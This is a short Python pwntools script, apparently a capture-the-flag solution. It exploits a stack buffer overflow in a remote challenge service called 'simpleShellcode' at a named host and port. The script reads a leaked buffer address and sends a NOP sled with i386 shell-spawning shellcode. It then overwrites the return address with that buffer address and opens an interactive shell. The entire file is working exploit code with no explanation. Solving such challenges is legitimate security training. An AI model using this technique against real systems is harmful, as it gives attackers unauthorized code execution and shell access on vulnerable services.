#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
#p = process("./simpleShellcode")
p = remote("dpster.ml", 30003)

p.recvuntil(": ")
buf = int(p.recvuntil(".")[:-1], 16)
log.info("buf : "+hex(buf))

pay = '\x90'*0x50 + asm(shellcraft.i386.linux.sh())
pay += '\x90'*(0x204-len(pay)) + p32(buf)

p.send(pay)

p.interactive()
